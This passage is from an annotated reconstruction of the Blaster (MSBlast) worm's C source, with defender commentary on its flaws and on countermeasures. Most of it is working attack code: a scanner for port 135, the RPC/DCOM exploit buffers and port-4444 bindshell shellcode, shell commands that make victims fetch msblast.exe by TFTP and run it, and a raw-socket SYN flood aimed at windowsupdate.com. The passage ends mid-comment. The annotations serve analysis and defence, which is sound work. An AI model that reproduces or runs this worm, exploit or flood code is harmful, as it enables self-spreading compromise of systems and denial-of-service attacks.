#define MYLANG MAKELANGID(LANG_ENGLISH, SUBLANG_DEFAULT)
#define LOCALE_409 MAKELCID(MYLANG, SORT_DEFAULT)
GetDateFormat( LOCALE_409, 
0, 
NULL, /*localtime, not GMT*/ 
"d", 
daystring, 
sizeof(daystring)); 
GetDateFormat( LOCALE_409, 
0, 
NULL, /*localtime, not GMT*/ 
"M", 
monthstring, 
sizeof(monthstring));
if (atoi(daystring) > 15 && atoi(monthstring) > 8)
CreateThread(NULL, 0, 
blaster_DoS_thread, 
0, 0, &ThreadId); 

/*
* As the final task of the program, go into worm mode
* trying to infect systems.
*/
for (;;)
blaster_spreader();

/*
* It'll never reach this point, but in theory, you need a
* WSACleanup() after a WSAStartup().
*/
WSACleanup();
} 



/*
* This will be called from CreateThread in the main worm body
* right after it connects to port 4444. After the thread is 
* started, it then sends the string "
* tftp -i %d.%d.%d.%d GET msblast.exe" (where the %ds represents
* the IP address of the attacker).
* Once it sends the string, it then waits for 20 seconds for the
* TFTP server to end. If the TFTP server doesn't end, it calls
* TerminateThread.
*/
DWORD WINAPI blaster_tftp_thread(LPVOID p)
{
/*
* This is the protocol format of a TFTP packet. This isn't
* used in the code -- I just provide it here for reference
*/
struct TFTP_Packet
{
short opcode;
short block_id;
char data[512];
};

char reqbuf[512]; /* request packet buffer */
struct sockaddr_in server; /* server-side port number */
struct sockaddr_in client; /* client IP address and port */
int sizeof_client; /* size of the client structure*/
char rspbuf[512]; /* response packet */

static int fd; /* the socket for the server*/
register FILE *fp;
register block_id;
register int block_size;

/* Set a flag indicating this thread is running. The other 
* thread will check this for 20 seconds to see if the TFTP
* service is still alive. If this thread is still alive in
* 20 seconds, it will be killed.
*/
is_tftp_running = TRUE; /*1 == TRUE*/

/* Create a server-socket to listen for UDP requests on */
fd = socket(AF_INET, SOCK_DGRAM, 0);
if (fd == SOCKET_ERROR)
goto closesocket_and_exit;

/* Bind the socket to 69/udp */
memset(&server, 0, sizeof(server));
server.sin_family = AF_INET;
server.sin_port = htons(TFTP_PORT_69); 
server.sin_addr.s_addr = 0; /*TFTP server addr = <any>*/
if (bind(fd, (struct sockaddr*)&server, sizeof(server)) != 0)
goto closesocket_and_exit;

/* Receive a packet, any packet. The contents of the received
* packet are ignored. This means, BTW, that a defensive 
* "worm-kill" could send a packet from somewhere else. This
* will cause the TFTP server to download the msblast.exe
* file to the wrong location, preventing the victim from
* doing the download. */
sizeof_client = sizeof(client);
if (recvfrom(fd, reqbuf, sizeof(reqbuf), 0, 
(struct sockaddr*)&client, &sizeof_client) <= 0)
goto closesocket_and_exit;

/* The TFTP server will respond with many 512 byte blocks
* until it has completely sent the file; each block must
* have a unique ID, and each block must be acknowledged.
* BUFORD: The worm ignores TFTP ACKs. This is probably why
* the worm restarts the TFTP service rather than leaving it
* enabled: it essentially flushes all the ACKs from the 
* the incoming packet queue. If the ACKs aren't flushed,
* the worm will incorrectly treat them as TFTP requests.
*/
block_id = 0;

/* Open this file. GetModuleFilename was used to figure out
* this filename. */
fp = fopen(msblast_filename, "rb");
if (fp == NULL)
goto closesocket_and_exit;

/* Continue sending file fragments until none are left */
for (;;) {
block_id++;

/* Build TFTP header */
#define TFTP_OPCODE_DATA 3
*(short*)(rspbuf+0) = htons(TFTP_OPCODE_DATA);
*(short*)(rspbuf+2)= htons((short)block_id);

/* Read next block of data (about 12 blocks total need
* to be read) */
block_size = fread(rspbuf+4, 1, 512, fp);

/* Increase the effective length to include the TFTP
* head built above */
block_size += 4;

/* Send this block */
if (sendto(fd, (char*)&rspbuf, block_size, 
0, (struct sockaddr*)&client, sizeof_client) <= 0)
break;

/* Sleep for a bit.
* The reason for this is because the worm doesn't care
* about retransmits -- it therefore must send these 
* packets slow enough so congestion doesn't drop them.
* If it misses a packet, then it will DoS the victim
* without actually infecting it. Worse: the intended
* victim will continue to send packets, preventing the
* worm from infecting new systems because the 
* requests will misdirect TFTP. This design is very
* bad, and is my bet as the biggest single factor
* that slows down the worm. */
Sleep(900);

/* File transfer ends when the last block is read, which
* will likely be smaller than a full-sized block*/
if (block_size != sizeof(rspbuf)) {
fclose(fp);
fp = NULL;
break;
}
} 

if (fp != NULL)
fclose(fp);

closesocket_and_exit:

/* Notify that the thread has stopped, so that the waiting 
* thread can continue on */
is_tftp_running = FALSE;
closesocket(fd);
ExitThread(0);

return 0;
}




/*
* This function increments the IP address. 
* BUFORD: This conversion from numbers, to strings, then back
* to number is overly complicated. Experienced programmers
* would simply store the number and increment it. This shows
* that Buford does not have much experience work with
* IP addresses.
*/
void blaster_increment_ip_address()
{
for (;;) {
if (ClassD <= 254) {
ClassD++;
return;
}

ClassD = 0;
ClassC++;
if (ClassC <= 254)
return;
ClassC = 0;
ClassB++;
if (ClassB <= 254)
return;
ClassB = 0;
ClassA++;
if (ClassA <= 254)
continue;
ClassA = 0;
return;
}
}


/*
* This is called from the main() function in an
* infinite loop. It scans the next 20 addresses,
* then exits.
*/
void blaster_spreader()
{
fd_set writefds;

register int i;
struct sockaddr_in sin;
struct sockaddr_in peer;
int sizeof_peer;
int sockarray[20];
int opt = 1;
const char *victim_ip;

/* Create the beginnings of a "socket-address" structure that
* will be used repeatedly below on the 'connect()' call for
* each socket. This structure specified port 135, which is
* the port used for RPC/DCOM. */
memset(&sin, 0, sizeof(sin));
sin.sin_family = AF_INET;
sin.sin_port = htons(MSRCP_PORT_135);

/* Create an array of 20 socket descriptors */
for (i=0; i<20; i++) {
sockarray[i] = socket(AF_INET, SOCK_STREAM, 0);
if (sockarray[i] == -1)
return;
ioctlsocket(sockarray[i], FIONBIO , &opt);
}

/* Initiate a "non-blocking" connection on all 20 sockets
* that were created above.
* FAQ: Essentially, this means that the worm has 20 
* "threads" -- even though they aren't true threads.
*/
for (i=0; i<20; i++) {
int ip;

blaster_increment_ip_address();
sprintf(target_ip_string, "%i.%i.%i.%i", 
ClassA, ClassB, ClassC, ClassD);

ip = inet_addr(target_ip_string);
if (ip == -1)
return;
sin.sin_addr.s_addr = ip;
connect(sockarray[i],(struct sockaddr*)&sin,sizeof(sin));
}

/* Wait 1.8-seconds for a connection.
* BUG: this is often not enough, especially when a packet
* is lost due to congestion. A small timeout actually makes
* the worm slower than faster */
Sleep(1800);

/* Now test to see which of those 20 connections succeeded.
* BUFORD: a more experienced programmer would have done
* a single 'select()' across all sockets rather than
* repeated calls for each socket. */
for (i=0; i<20; i++) {
struct timeval timeout;
int nfds;

timeout.tv_sec = 0;
timeout.tv_usec = 0;
nfds = 0;

FD_ZERO(&writefds);
FD_SET((unsigned)sockarray[i], &writefds);

if (select(0, NULL, &writefds, NULL, &timeout) != 1) {
closesocket(sockarray[i]);
} else {
sizeof_peer = sizeof(peer);
getpeername(sockarray[i],
(struct sockaddr*)&peer, &sizeof_peer); 
victim_ip = inet_ntoa(peer.sin_addr);

/* If connection succeeds, exploit the victim */
blaster_exploit_target(sockarray[i], victim_ip);
closesocket(sockarray[i]);
}
}

}

/*
* This is where the victim is actually exploited. It is the same
* exploit as created by xfocus and altered by HDMoore.
* There are a couple of differences. The first is that the in
* those older exploits, this function itself would create the
* socket and connect, whereas in Blaster, the socket is already
* connected to the victim via the scanning function above. The
* second difference is that the packets/shellcode blocks are
* declared as stack variables rather than as static globals.
* Finally, whereas the older exploits give the hacker a 
* "shell prompt", this one automates usage of the shell-prompt
* to tell the victim to TFTP the worm down and run it.
*/
void blaster_exploit_target(int sock, const char *victim_ip)
{

/* These blocks of data are just the same ones copied from the
* xfocus exploit prototype. Whereas the original exploit
* declared these as "static" variables, Blaster declares
* these as "stack" variables. This is because the xfocus
* exploit altered them -- they must be reset back to their
* original values every time. */
unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,

0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,

0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,
0x00,0x00,0x00,0x00,
0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};



unsigned char request1[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03
,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00

,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45

,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E

,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D

,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41

,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00

,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45

,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00

,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00

,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03

,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00

,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29

,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00

,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00

,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00

,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10

,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF

,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10

,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09

,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00

,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00

,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00

,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00

,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01

,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03

,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00

,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E

,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00

,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00

,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00

,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00

,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00

,0x00,0x00,0x00,0x00,0x00,0x00};

unsigned char request2[]={
0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x5C,0x00,0x5C,0x00};

unsigned char request3[]={
0x5C,0x00
,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00

,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00

,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00

,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};


unsigned char sc[]=
"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00"
"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"
"\x46\x00\x58\x00\x46\x00\x58\x00"

"\xff\xff\xff\xff" /* return address */

"\xcc\xe0\xfd\x7f" /* primary thread data block */
"\xcc\xe0\xfd\x7f" /* primary thread data block */

/* port 4444 bindshell */
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"
"\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"
"\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"
"\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"
"\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"
"\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"
"\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"
"\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81"
"\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"
"\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"
"\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"
"\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"
"\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"
"\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"
"\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"
"\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"
"\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"
"\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"
"\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"
"\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"
"\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"
"\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"
"\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"
"\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"
"\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"
"\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"
"\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"
"\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"
"\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"
"\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"
"\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"
"\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04";



unsigned char request4[]={
0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00

,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C

,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

int ThreadId;
int len;
int sizeof_sa;
int ret;
int opt;
void *hThread;
struct sockaddr_in target_ip;
struct sockaddr_in sa;
int fd;
char cmdstr[0x200];
int len1;
unsigned char buf2[0x1000];
int i;

/* 
* Turn off non-blocking (i.e. re-enable blocking mode) 
* DEFENSE: Tarpit programs (e.g. 'labrea' or 'deredoc')
* will slow down the spread of this worm. It takes a long
* time for blocking calls to timeout. I had several 
* thousand worms halted by my 'deredoc' tarpit.
*/
opt = 0;
ioctlsocket(sock, FIONBIO , &opt);

/*
* Choose whether the exploit targets Win2k or WinXP.
*/
if (winxp1_or_win2k2 == 1)
ret = 0x100139d;
else
ret = 0x18759f;
memcpy(sc+36, (unsigned char *) &ret, 4);

/* ----------------------------------------------
* This section is just copied from the original exploit
* script. This is the same as the scripts that have been
* widely published on the Internet. */
len=sizeof(sc);
memcpy(buf2,request1,sizeof(request1));
len1=sizeof(request1);

*(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(sc)/2; 
*(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(sc)/2;

memcpy(buf2+len1,request2,sizeof(request2));
len1=len1+sizeof(request2);
memcpy(buf2+len1,sc,sizeof(sc));
len1=len1+sizeof(sc);
memcpy(buf2+len1,request3,sizeof(request3));
len1=len1+sizeof(request3);
memcpy(buf2+len1,request4,sizeof(request4));
len1=len1+sizeof(request4);

*(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(sc)-0xc;


*(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(sc)-0xc; 
*(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(sc)-0xc;
*(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(sc)-0xc;

if (send(sock,bindstr,sizeof(bindstr),0)== -1)
{
//perror("- Send");
return;
}


if (send(sock,buf2,len1,0)== -1)
{
//perror("- Send");
return;
}
closesocket(sock);
Sleep(400);
/* ----------------------------------------------*/


/*
* This section of code connects to the victim on port 4444.
* DEFENSE : This means you can block this worm by blocking
* TCP port 4444.
* FAQ: This port is only open for the brief instant needed
* to exploit the victim. Therefore, you can't scan for 
* port 4444 in order to find Blaster victims.
*/
if ((fd=socket(AF_INET,SOCK_STREAM,0)) == -1)
return;
memset(&target_ip, 0, sizeof(target_ip));
target_ip.sin_family = AF_INET;
target_ip.sin_port = htons(SHELL_PORT_4444);
target_ip.sin_addr.s_addr = inet_addr(victim_ip);
if (target_ip.sin_addr.s_addr == SOCKET_ERROR)
return;
if (connect(fd, (struct sockaddr*)&target_ip, 
sizeof(target_ip)) == SOCKET_ERROR)
return;

/*
* This section recreates the IP address from whatever IP
* address this successfully connected to. In practice,
* the strings "victim_ip" and "target_ip_string" should be
* the same.
*/
memset(target_ip_string, 0, sizeof(target_ip_string));
sizeof_sa = sizeof(sa);
getsockname(fd, (struct sockaddr*)&sa, &sizeof_sa);
sprintf(target_ip_string, "%d.%d.%d.%d", 
sa.sin_addr.s_net, sa.sin_addr.s_host, 
sa.sin_addr.s_lh, sa.sin_addr.s_impno);

/*
* This section creates a temporary TFTP service that is 
* ONLY alive during the period of time that the victim
* needs to download.
* FAQ: You can't scan for TFTP in order to find Blaster 
* victims because the port is rarely open.
*/
if (fd_tftp_service)
closesocket(fd_tftp_service);
hThread = CreateThread(0,0,
blaster_tftp_thread,0,0,&ThreadId);
Sleep(80); /*give time for thread to start*/

/*
* This sends the command
* tftp -i 1.2.3.4 GET msblast.exe
* to the victim. The "tftp.exe" program is built into
* Windows. It's intended purpose is to allow users to 
* manually update their home wireless access points with
* new software (and other similar tasks). However, it is
* not intended as a generic file-transfer protocol (it
* stands for "trivial-file-transfer-protocol" -- it is
* intended for only trivial tasks). Since a lot of hacker
* exploits use the "tftp.exe" program, a good hardening
* step is to remove/rename it.
*/
sprintf(cmdstr, "tftp -i %s GET %s\n", 
target_ip_string, MSBLAST_EXE);
if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
goto closesocket_and_return;

/* 
* Wait 21 seconds for the victim to request the file, then
* for the file to be delivered via TFTP.
*/
Sleep(1000);
for (i=0; i<10 && is_tftp_running; i++)
Sleep(2000);

/*
* Assume the the transfer is successful, and send the 
* command to start executing the newly downloaded program.
* BUFORD: The hacker starts this twice. Again, it 
* demonstrates a lock of confidence, so he makes sure it's
* started by doing it twice in slightly different ways.
* Note that the "BILLY" mutex will prevent from actually
* running twice.
*/
sprintf(cmdstr, "start %s\n", MSBLAST_EXE);
if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
goto closesocket_and_return;
Sleep(2000);
sprintf(cmdstr, "%s\n", MSBLAST_EXE);
send(fd, cmdstr, strlen(cmdstr), 0);
Sleep(2000);


/*
* This section closes the things started in this procedure
*/
closesocket_and_return:

/* Close the socket for the remote command-prompt that has
* been established to the victim. */
if (fd != 0)
closesocket(fd);

/* Close the TFTP server that was launched above. As noted,
* this means that the TFTP service is not running most of
* the time, so it's not easy to scan for infected systems.
*/
if (is_tftp_running) {
TerminateThread(hThread,0);
closesocket(fd_tftp_service);
is_tftp_running = 0;
}
CloseHandle(hThread);
}


/**
* Convert the name into an IP address. If the IP address
* is formatted in decimal-dot-notation (e.g. 192.2.0.43),
* then return that IP address, otherwise do a DNS lookup
* on the address. Note that in the case of the worm,
* it always gives the string "windowsupdate.com" to this
* function, and since Microsoft turned off that name,
* the DNS lookup will usually fail, so this function
* generally returns -1 (SOCKET_ERROR), which means the
* address 255.255.255.255.
*/
int blaster_resolve_ip(const char *windowsupdate_com)
{
int result;

result = inet_addr(windowsupdate_com);
if (result == SOCKET_ERROR) {
HOSTENT *p_hostent = gethostbyname(windowsupdate_com);
if (p_hostent == NULL)
result = SOCKET_ERROR;
else
result = *p_hostent->h_addr;
}

return result;
}


/*
* This thre
*/
ULONG WINAPI blaster_DoS_thread(LPVOID p)
{
int opt = 1;
int fd;
int target_ip;


/* Lookup the domain-name. Note that no checking is done 
* to ensure that the name is valid. Since Microsoft turned
* this off in their domain-name servers, this function now
* returns -1. */
target_ip = blaster_resolve_ip("windowsupdate.com");


/* Create a socket that the worm will blast packets at 
* Microsoft from. This is what is known as a "raw" socket. 
* So-called "raw-sockets" are ones where packets are 
* custom-built by the programmer rather than by the TCP/IP 
* stack. Note that raw-sockets were not available in Windows
* until Win2k. A cybersecurity pundit called Microsoft
* "irresponsible" for adding them. 
* <http://grc.com/dos/sockettome.htm>
* That's probably an
* unfairly harsh judgement (such sockets are available in
* every other OS), but it's true that it puts the power of
* SYNflood attacks in the hands of lame worm writers. While
* the worm-writer would probably have chosen a different
* DoS, such as Slammer-style UDP floods, it's likely that
* Buford wouldn't have been able to create a SYNflood if
* raw-sockets had not been added to Win2k/WinXP. */
fd = WSASocket(
AF_INET, /*TCP/IP sockets*/
SOCK_RAW, /*Custom TCP/IP headers*/
IPPROTO_RAW,
NULL,
0,
WSA_FLAG_OVERLAPPED
);
if (fd == SOCKET_ERROR)
return 0;

/* Tell the raw-socket that IP headers will be created by the
* programmer rather than the stack. Most raw sockets in
* Windows will also have this option set. */
if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, 
(char*)&opt, sizeof(opt)) == SOCKET_ERROR)
return 0;


/* Now do the SYN flood. The worm writer decided to flood
* slowly by putting a 20-millisecond delay between packets
* -- causing only 500 packets/second, or roughly, 200-kbps.
* There are a couple of reasons why the hacker may have
* chosen this. 
